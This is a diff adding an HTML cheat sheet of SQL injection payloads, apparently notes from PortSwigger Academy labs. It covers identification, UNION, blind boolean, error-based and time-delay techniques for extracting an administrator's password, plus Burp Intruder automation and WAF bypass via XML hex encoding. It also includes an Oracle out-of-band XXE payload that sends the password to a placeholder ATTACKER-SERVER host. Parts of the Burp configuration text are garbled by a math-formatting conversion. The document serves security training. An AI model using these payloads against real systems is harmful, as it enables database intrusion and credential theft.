@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>SQLI</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="sql-injection">SQL Injection</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for SQLi Vulnerabilities</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p>
+<ul>
+<li><p><a href="#identification-payloads">Identification
+Payloads</a></p></li>
+<li><p><a href="#examples">Examples</a></p></li>
+<li><p><a href="#exploitation-payloads">Exploitation Payloads</a></p>
+<ul>
+<li><p><a href="#sqli-union-technique-example">SQLi UNION Technique
+Example</a></p></li>
+<li><p><a href="#sqli-blind-conditional-responses-examples">SQLi Blind
+Conditional Responses Examples</a></p></li>
+<li><p><a href="#sqli-blind-conditional-errors-examples">SQLi Blind
+Conditional Errors Examples</a></p></li>
+<li><p><a href="#visible-error-based-sql-injection">Visible Error-based
+SQL Injection</a></p></li>
+<li><p><a href="#sqli-blind-time-delays-examples">SQLi Blind Time Delays
+Examples</a></p></li>
+<li><p><a href="#sqli-out-of-band-interaction">SQLi Out of Band
+Interaction</a></p></li>
+<li><p><a href="#sql-injection-with-filter-bypass-via-xml-encoding">SQL
+Injection with filter bypass via XML encoding</a></p></li>
+</ul></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><p>https://portswigger.net/web-security/sql-injection</p></li>
+<li><p>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection</p></li>
+<li><p>https://owasp.org/www-community/attacks/SQL_Injection</p></li>
+<li><p><strong>Check out the Scripts folder for Blind SQL Injection Data
+Exfiltration scripts</strong></p></li>
+</ul>
+<p><br></p>
+<h2 id="recon">Recon</h2>
+<h3 id="how-to-identify-vulnerability">How to Identify
+Vulnerability</h3>
+<ul>
+<li><p>The first step is to identify when the application is interacting
+with a backend database. Make a list of all input fields from the
+application that are potentially being used to create an SQL query and
+test each one of those fields separately.</p></li>
+<li><p>After mapping out the application, the next steps will be to
+include specific SQL payloads to identify if the input fields are
+vulnerable to SQL injection. Some of those payloads can be:</p></li>
+<li><p>Submit a single/double quote characters and look for errors or
+anomalies:</p>
+<ul>
+<li><p>’</p></li>
+<li><p>’’</p></li>
+<li><p>’–</p></li>
+<li><p>’#</p></li>
+</ul></li>
+<li><p>Submit SQL syntax that evaluates to the original value of the
+entry point, and a different value. Look for differences in
+application’s response.</p>
+<ul>
+<li><p>Example: String concatenation</p>
+<ul>
+<li>?parameter1=Accessorie’||’s<br />
+</li>
+<li>?parameter1 =Accessorie’||’wrongvalue</li>
+</ul></li>
+</ul></li>
+<li><p>Submit Boolean conditions and look for differences in the
+application’s responses:</p>
+<ul>
+<li>’ or 1=1<br />
+</li>
+<li>’ or 1=2<br />
+</li>
+<li>’ and ‘1’=’1</li>
+</ul></li>
+<li><p>Submit payloads that will trigger time delays and look for
+differences in the time it takes for the application to respond:</p>
+<ul>
+<li>; select pg_sleep(10)</li>
+</ul></li>
+<li><p>Try using out-of-band exploitation techniques if none of the
+other techniques work (error-based, conditional-based, time-delays,
+union)</p></li>
+</ul>
+<p><br></p>
+<p><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><strong>Depending on the database type, these payloads may be
+different.</strong></p>
+<ul>
+<li><p>https://portswigger.net/web-security/sql-injection/cheat-sheet</p></li>
+<li><p>https://pentestmonkey.net/cheat-sheet</p></li>
+</ul>
+<p><br></p>
+<h3 id="identification-payloads">Identification Payloads</h3>
+<ul>
+<li><p>Submit the following payload in the input fields and identify if
+there is any error messages or a notable difference from the original
+response:</p>
+<ul>
+<li>’</li>
+</ul></li>
+<li><p>Submit the following payloads in the input fields. If there was
+an error message with the previous payload^, identify if it has gone
+away (these 2 payloads below, are meant to “fix” the current query
+statement to prevent any exceptions from occurring) or if there are any
+notable differences from original response:</p>
+<ul>
+<li><p>’–</p></li>
+<li><p>’’</p></li>
+</ul></li>
+<li><p>Submit the following payloads in the input fields. Identify if
+there is a notable difference from the original response. The (1=1) is
+equal to True, so the response size for these ones are usually larger
+than the (1=2) payload as that is equal to False.</p>
+<ul>
+<li><p>’ or 1=1–</p></li>
+<li><p>’ or ‘1’=’1</p></li>
+<li><p>’ or 1=2–</p></li>
+<li><p>’ or ‘1’=’2</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h4 id="conditional-payloads">Conditional Payloads</h4>
+<ul>
+<li><p>Submit the following payloads in the input fields. Identify if
+there is a notable difference in the responses from (1=1) and (1=2). The
+key here is to determine how the application responds with True vs False
+statements.</p></li>
+<li><p><strong>Example scenario:</strong> If the original response and
+the response from (1=1) payload are the <strong>same</strong> but when
+injecting the (1=2) payload there’s a <strong>difference</strong>
+comparing to the original response, then the field may be susceptible to
+SQLi.</p>
+<ul>
+<li><p>’ and 1=1–</p></li>
+<li><p>’ and ‘1’=’1</p></li>
+<li><p>’ and 1=2–</p></li>
+<li><p>’ and ‘1’=’2</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h4 id="string-concatenation">String Concatenation</h4>
+<ul>
+<li>Another technique we can use to identify SQLi, is String
+Concatenation:</li>
+</ul>
+<ol type="1">
+<li><p>The original parameter/value:</p>
+<ul>
+<li>?category=Gifts</li>
+</ul></li>
+<li><p>Use String Concatenation that will resolve to the original
+value:</p>
+<ul>
+<li>?category=Gift’||’s</li>
+</ul></li>
+<li><p>Use String Concatenation that will not resolve to the original
+value:</p>
+<ul>
+<li>?category=Gift’||’sss</li>
+</ul></li>
+</ol>
+<ul>
+<li>If the 1st and 2nd payloads result in the same response, but the 1st
+and 3rd don’t, then the field may be vulnerable to SQLi.</li>
+</ul>
+<p><strong>Sometimes our injected input may be reflected in the
+response. So, the response size may differ slightly even if they return
+the same data.</strong></p>
+<p><br></p>
+<h4 id="time-delay-payloads">Time-Delay Payloads</h4>
+<ul>
+<li><p>We can also inject Time-Delay payloads in the input fields. If
+the application has a notable delay in its response from the normal
+time, then the input field may be vulnerable to SQLi:</p>
+<ul>
+<li><p>PostgreSQL:</p>
+<ul>
+<li>; select pg_sleep(10)–</li>
+</ul></li>
+<li><p>Oracle DB:</p>
+<ul>
+<li>‘||(select dbms_pipe.receive_message((’a’),10) from dual)||’</li>
+</ul></li>
+<li><p>MySQL:</p>
+<ul>
+<li>;select sleep(10)–</li>
+</ul></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h4 id="out-of-band-techniques">Out of Band Techniques</h4>
+<ul>
+<li><a href="#sqli-out-of-band-interaction">Payloads</a></li>
+</ul>
+<p><br><br><br><br></p>
+<h3 id="examples">Examples</h3>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/SQL%20Injection/Images/sqli-1.png"
+alt="SQL-1" />
+<figcaption aria-hidden="true">SQL-1</figcaption>
+</figure>
+<p><br><br></p>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/SQL%20Injection/Images/sqli-2.png"
+alt="SQL-2" />
+<figcaption aria-hidden="true">SQL-2</figcaption>
+</figure>
+<p><br><br></p>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/SQL%20Injection/Images/sqli-3.png"
+alt="SQL-3" />
+<figcaption aria-hidden="true">SQL-3</figcaption>
+</figure>
+<p><br><br></p>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/SQL%20Injection/Images/sqli-4.png"
+alt="SQL-4" />
+<figcaption aria-hidden="true">SQL-4</figcaption>
+</figure>
+<p><br><br></p>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/SQL%20Injection/Images/sqli-5.png"
+alt="SQL-5" />
+<figcaption aria-hidden="true">SQL-5</figcaption>
+</figure>
+<p><br><br><br><br></p>
+<p><strong>This next section contains the specific techniques/payloads
+that were used in the labs, to extract sensitive information from the
+databases.</strong></p>
+<p><br></p>
+<h3 id="exploitation-payloads">Exploitation Payloads</h3>
+<p><br></p>
+<h4 id="sqli-union-technique-example">SQLi UNION Technique Example</h4>
+<ul>
+<li><p>This technique works if the results of the query are being
+returned in the response, if not Blind techniques will have to be
+used.</p></li>
+<li><p>First, we need to determine how the application responds to a
+valid vs invalid query. With this information we will be able to
+determine whether our injected payloads are valid or invalid.</p></li>
+</ul>
+<p><br></p>
+<ol type="1">
+<li><strong>Determine how many columns are in the original
+query.</strong> The number of “nulls” injected needs to be
+adjusted:</li>
+</ol>
+<pre><code>&#39; union select null, null--</code></pre>
+<ol start="2" type="1">
+<li><strong>Determine which of those columns return String
+data:</strong></li>
+</ol>
+<pre><code>&#39; union select &#39;Test&#39;, null--</code></pre>
+<ol start="3" type="1">
+<li><strong>Extract table names from the database:</strong></li>
+</ol>
+<pre><code>&#39; union select table_name, null from information_schema.tables--</code></pre>
+<ol start="4" type="1">
+<li><strong>Extract column names from those tables:</strong></li>
+</ol>
+<pre><code>&#39; union select null,column_name from information_schema.columns where table_name = &#39;users&#39;--</code></pre>
+<p><br></p>
+<p><strong>Retrieve multiple values in a single column:</strong></p>
+<pre><code>&#39;+UNION+SELECT+NULL,username||&#39;~&#39;||password+FROM+users--</code></pre>
+<p><br><br><br></p>
+<h4 id="sqli-blind-conditional-responses-examples">SQLi Blind
+Conditional Responses Examples</h4>
+<ul>
+<li><p>Identify if the below payloads result in a notable difference in
+the responses. The key here is to know how the application responds to a
+true statement (1=1) vs a false statement (1=2):</p>
+<ul>
+<li><p>’ and ‘1’=’1</p></li>
+<li><p>’ and ‘1’=’2</p></li>
+<li><p>’ and 1=1–</p></li>
+<li><p>’ and 1=2–</p></li>
+</ul></li>
+<li><p>Once we can identify how the application responds to a True vs
+False query, we can use the below payloads to extract useful
+information. Depending on the response we receive, we know that the
+query injected is either valid or invalid.</p></li>
+</ul>
+<p><br></p>
+<ul>
+<li><strong>Payloads to enumerate table names.</strong> Even though
+UNION attacks won’t do us any good here in Blind SQLi, this technique
+can still be used to enumerate table names:</li>
+</ul>
+<pre><code>&#39;and (select &#39;a&#39; from {tableName} limit 1)=&#39;a</code></pre>
+<pre><code>&#39;union select &#39;a&#39; from {tableName} where 1=1--</code></pre>
+<ul>
+<li><strong>Payloads to enumerate column names.</strong> The 2nd payload
+requires to know at least 1 username on the database:</li>
+</ul>
+<pre><code>&#39;union select {columnName} from users where 1=1--</code></pre>
+<pre><code>&#39;union select &#39;a&#39; from users where {columnName}=&#39;administrator&#39;--</code></pre>
+<ul>
+<li><strong>Payloads to enumerate valid users that are in a column
+called username:</strong></li>
+</ul>
+<pre><code>&#39;and (select &#39;a&#39; from users where username=&#39;{userName}&#39;)=&#39;a</code></pre>
+<ul>
+<li><strong>Payloads to determine the length of a user’s password. This
+payload uses a table called users and 2 columns called username and
+password:</strong></li>
+</ul>
+<pre><code>&#39; and (select &#39;a&#39; from users where username=&#39;administrator&#39; and length(password)&gt;10)=&#39;a</code></pre>
+<ul>
+<li><strong>Payloads to extract the password of a user 1 character at a
+time:</strong></li>
+</ul>
+<pre><code>&#39; and (select substring(password,1,1) from users where username=&#39;administrator&#39;)=&#39;{character}</code></pre>
+<p><br></p>
+<p>Burp Intruder or the script in the “Scripts” folder can be used to
+help automate the extraction of password:</p>
+<p>For Burp Intruder use the following configurations: * Attack Type:
+Cluster Bomb * Payload Positions: 2 position markers need to be set: *
+The first one should be on the character offset position in the password
+-&gt; …substring(password, <span
+class="math display">, 1) * <em>T</em><em>h</em><em>e</em><em>s</em><em>e</em><em>c</em><em>o</em><em>n</em><em>d</em><em>m</em><em>a</em><em>r</em><em>k</em><em>e</em><em>r</em><em>s</em><em>h</em><em>o</em><em>u</em><em>l</em><em>d</em><em>b</em><em>e</em><em>o</em><em>n</em><em>t</em><em>h</em><em>e</em><em>a</em><em>c</em><em>t</em><em>u</em><em>a</em><em>l</em><em>l</em><em>y</em><em>c</em><em>h</em><em>a</em><em>r</em><em>a</em><em>c</em><em>t</em><em>e</em><em>r</em><em>t</em><em>o</em><em>t</em><em>e</em><em>s</em><em>t</em>− &gt; ...<em>w</em><em>h</em><em>e</em><em>r</em><em>e</em><em>u</em><em>s</em><em>e</em><em>r</em><em>n</em><em>a</em><em>m</em><em>e</em> = ′<em>a</em><em>d</em><em>m</em><em>i</em><em>n</em><em>i</em><em>s</em><em>t</em><em>r</em><em>a</em><em>t</em><em>o</em><em>r</em>′) = ′</span>
+* Payloads: * First marker - Numbers From 1 to 20 * Second marker -
+include alphanumeric characters (Burp Pro has the payload list that can
+be added.) * View Results: Filter by the Response Length column or use
+the Grep function to search for the keyword. After sorting, it should be
+easy to manually put together the password.</p>
+<ul>
+<li>Note: If having trouble sorting by 2 columns in Burp Suite. You can
+copy/paste only the necessary columns in an Excel sheet, sort them
+appropriately by the “Payload 1” request so they are in order (1-20)
+positions. Then use the =CONCAT() command on the “Payload 2” column so
+the password is combined automatically.</li>
+</ul>
+<p><br><br><br></p>
+<h4 id="sqli-blind-conditional-errors-examples">SQLi Blind Conditional
+Errors Examples</h4>
+<ul>
+<li><p>Identify if the following 2 payloads result in a notable
+difference in the responses from the application:</p>
+<ul>
+<li><p>’ and 1=1–</p></li>
+<li><p>’ and 1=0–</p></li>
+</ul></li>
+<li><p>Identify if the below payloads cause an SQL exception or error
+message. Dividing by zero may cause an exception:</p>
+<ul>
+<li><p>’ and to_char(1/1)=1–</p></li>
+<li><p>’ and to_char(1/0)=1–</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<ul>
+<li><strong>Payloads to enumerate table names:</strong></li>
+</ul>
+<pre><code>&#39;||(select &#39;&#39; from {tableName} where rownum = 1)||&#39;</code></pre>
+<pre><code>&#39;union select &#39;a&#39; from {tableName} where 1=1--</code></pre>
+<ul>
+<li><strong>Payloads to determine if there is a user named administrator
+on the table called users.</strong> If the <u>user exists</u>, then an
+error (1/0) will result. Basically, if the <u>query is valid</u> then an
+exception will occur, if it is <u>not valid</u> then the ’’ will be
+executed:</li>
+</ul>
+<pre><code>&#39;||(select case when(1=1) then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;</code></pre>
+<ul>
+<li><strong>Payloads to determine the length of the password for a user
+called administrator.</strong> If the password is greater than 20
+characters, then an error (1/0) will result:</li>
+</ul>
+<pre><code>&#39;||(select case when length(password)&gt;20 then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;</code></pre>
+<ul>
+<li><p><strong>Extract the password of a user.</strong> For both
+payloads, if the character in the current position is correct, then the
+error (1/0) will execute:</p>
+<ul>
+<li>Oracle DB:</li>
+</ul></li>
+</ul>
+<pre><code>&#39;||(select case when(substr((select password from users where username=&#39;administrator&#39;),1,1)=&#39;z&#39;) then to_char(1/0) else &#39;&#39; end from dual)||&#39;</code></pre>
+<pre><code>&#39;||(select case when substr(password,1,1)=&#39;z&#39; then to_char(1/0) else &#39;&#39; end from users where username = &#39;administrator&#39;)||&#39;</code></pre>
+<p><br></p>
+<p>Burp Intruder or the script in the “Scripts” folder can be used to
+help automate the extraction of password:</p>
+<p>For Burp Intruder use the following configurations: * Attack Type:
+Cluster Bomb * Payload Positions: 2 position markers need to be set: *
+The first one should be on the character offset position in the password
+* The second marker should be on the actually character to test * where
+username=‘administrator’),<span class="math display">, 1) = ′</span>’) *
+Payloads: * First marker - Numbers From 1 to 20 * Second marker -
+include alphanumeric characters (Burp Pro has the payload list that can
+be added.) * View Results: Filter by the status code. The results that
+contain the 500 code are the correct ones. After sorting, it should be
+easy to manually put together the password.</p>
+<ul>
+<li>Note: If having trouble sorting by 2 columns in Burp Suite. You can
+copy/paste only the necessary columns in an Excel sheet, sort them
+appropriately by the “Payload 1” request so they are in order (1-20)
+positions. Then use the =CONCAT() command on the “Payload 2” column so
+the password is combined automatically.</li>
+</ul>
+<p><br><br><br></p>
+<h4 id="visible-error-based-sql-injection">Visible Error-based SQL
+Injection</h4>
+<ul>
+<li><p>These payloads can be used when the application is returning a
+verbose error message in it’s response. Many times the application will
+display the results of the query within the error message in the
+response.</p></li>
+<li><p>Specifically the “cast” command enables us to convert one data
+type to another. Attempting to convert a String data type to an Integer
+will cause an error.</p></li>
+</ul>
+<pre><code>&#39; and 1=cast((select 1) as int)--</code></pre>
+<pre><code>&#39; and 1=cast((select username from users) as int)--</code></pre>
+<pre><code>&#39; and 1=cast((select username from users limit 1) as int)--</code></pre>
+<pre><code>&#39; and 1=cast((select password from users limit 1) as int)--</code></pre>
+<p><br><br><br></p>
+<h4 id="sqli-blind-time-delays-examples">SQLi Blind Time Delays
+Examples</h4>
+<ul>
+<li><p>Encode:</p>
+<ul>
+<li>; -&gt; %3b</li>
+</ul></li>
+<li><p>Identify if any of the below payloads cause a time delay on the
+application’s response. Portswigger has a cheat sheet that has more:</p>
+<ul>
+<li><p>‘||(select dbms_pipe.receive_message((’a’),10) from
+dual)||’</p></li>
+<li><p>’%3b select sleep(10)–</p></li>
+<li><p>’%3b select pg_sleep(10)–</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<ul>
+<li><strong>Payload to enumerate valid tables in the database.</strong>
+In this example if the <u>table users does exist</u> then the
+application will sleep, if it doesn’t exist then the application should
+respond normally:</li>
+</ul>
+<pre><code>&#39;%3b select case when (1=1) then pg_sleep(10) else null end from users-- </code></pre>
+<ul>
+<li><strong>Payloads to identify if a user called administrator exists
+on the table called users:</strong></li>
+</ul>
+<pre><code>&#39;%3b select case when (username=&#39;administrator&#39;) then pg_sleep(10) else pg_sleep(0) end from users--</code></pre>
+<pre><code>&#39;%3b select case when ((select &#39;TEST&#39; from users where username=&#39;administrator&#39;)=&#39;TEST&#39;) then pg_sleep(10) else null end--</code></pre>
+<ul>
+<li><strong>Identify the length of the password for a user called
+administrator:</strong></li>
+</ul>
+<pre><code>&#39;%3b select case when (username=&#39;administrator&#39; and length(password)&gt;1) then pg_sleep(10) else pg_sleep(0) end from users--</code></pre>
+<pre><code>&#39;%3b select case when ((select &#39;TEST&#39; from users where username=&#39;administrator&#39; and length(password)&gt;10)=&#39;TEST&#39;) then pg_sleep(10) else null end--</code></pre>
+<ul>
+<li><strong>Extract the password from a user called
+administrator.</strong> The columns here are username and password. The
+table is users.:</li>
+</ul>
+<pre><code>&#39;%3b select case when (username=&#39;administrator&#39; and substring(password,1,1)=&#39;a&#39;) then pg_sleep(10) else pg_sleep(0) end from users--</code></pre>
+<pre><code>&#39;%3b select case when (substring((select password from users where username =&#39;administrator&#39;),1,1)=&#39;f&#39;) then pg_sleep(10) else null end--</code></pre>
+<p><br></p>
+<p>For Burp Intruder use the following configurations: * Attack Type:
+Cluster Bomb * Payload Positions: 2 position markers need to be set: *
+The first one should be on the character offset position in the password
+* The second marker should be on the actually character to test * where
+username=‘administrator’),<span class="math display">, 1) = ′</span>’) *
+Payloads: * First marker - Numbers From 1 to 20 * Second marker -
+include alphanumeric characters (Burp Pro has the payload list that can
+be added.) * View Results: Filter by the Response received/completed
+columns. The higher values should have the correct character in their
+positions. After sorting, it should be easy to manually put together the
+password.</p>
+<ul>
+<li>Note: If having trouble sorting by 2 columns in Burp Suite. You can
+copy/paste only the necessary columns in an Excel sheet, sort them
+appropriately by the “Payload 1” request so they are in order (1-20)
+positions. Then use the =CONCAT() command on the “Payload 2” column so
+the password is combined automatically.</li>
+</ul>
+<p><br><br><br></p>
+<h4 id="sqli-out-of-band-interaction">SQLi Out of Band Interaction</h4>
+<ul>
+<li><p><strong>Example: Out of Band Interaction</strong></p></li>
+<li><p>https://portswigger.net/web-security/sql-injection/cheat-sheet#dns-lookup</p></li>
+<li><p>Here we are using a method called extractvalue(), that takes in a
+XML type instance and XPath expression(this argument doesn’t matter much
+it just needs to be there to execute correctly).</p></li>
+<li><p>An XXE payload using a parameter entity called remote is used,
+that will reach out to our attacker server.</p>
+<ul>
+<li>Oracle DB:</li>
+</ul></li>
+</ul>
+<pre><code>&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//ATTACKER-SERVER/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--</code></pre>
+<p>Decoded Version:</p>
+<pre><code>&#39; UNION SELECT extractvalue(
+xmltype(&#39;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ATTACKER-SERVER/&quot;&gt; %remote;]&gt;
+&#39;)
+,&#39;/1&#39;) 
+FROM dual--</code></pre>
+<p><br></p>
+<ul>
+<li><p><strong>Example: Out of Band Data Exfiltration</strong></p></li>
+<li><p>Here we are using a method called extractvalue(), that takes in a
+XML type instance and XPath expression(this argument doesn’t matter much
+it just needs to be there to execute correctly).</p></li>
+<li><p>An XXE payload using a parameter entity called remote is used,
+that will reach out to our attacker server. The application will
+evaluate the SQL query before the XXE payload is executed.</p>
+<ul>
+<li>Oracle DB:</li>
+</ul></li>
+</ul>
+<pre><code>&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#39;||(SELECT+password+FROM+users+WHERE+username%3d&#39;administrator&#39;)||&#39;.ATTACKER-SERVER/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--</code></pre>
+<p>Decoded Version:</p>
+<pre><code>&#39; UNION SELECT extractvalue(
+xmltype(&#39;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(select password from users where username = &#39;administrator&#39;)||&#39;.ATTACKER-SERVER/&quot;&gt; %remote;]&gt;
+&#39;)
+,&#39;/1&#39;) 
+FROM dual--</code></pre>
+<p><br><br><br></p>
+<h4 id="sql-injection-with-filter-bypass-via-xml-encoding">SQL Injection
+with filter bypass via XML encoding</h4>
+<ul>
+<li>Example: SQL injection vectors can exist in other areas of the
+application such as JSON or XML inputs. This can allows us to obfuscate
+the payloads in different ways to bypass filters.</li>
+</ul>
+<pre><code>&lt;stockCheck&gt;
+    &lt;productId&gt;
+        123
+    &lt;/productId&gt;
+    &lt;storeId&gt;
+        999 &amp;#x53;ELECT * FROM information_schema.tables
+    &lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+<ul>
+<li><p>Example: Use the Hackvertor extension from Burp to help encode
+the payload and bypass any WAF.</p></li>
+<li><p>Hackvertor -&gt; Encode -&gt; hex_entities</p></li>
+</ul>
+<pre><code>&lt;storeId&gt;
+&lt;@hex_entities&gt;
+1 UNION SELECT username || &#39;~&#39; || password FROM users
+&lt;@/hex_entities&gt;
+&lt;/storeId&gt;</code></pre>
+<p><br><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet.</li>
+</ul>
+</body>
+</html>
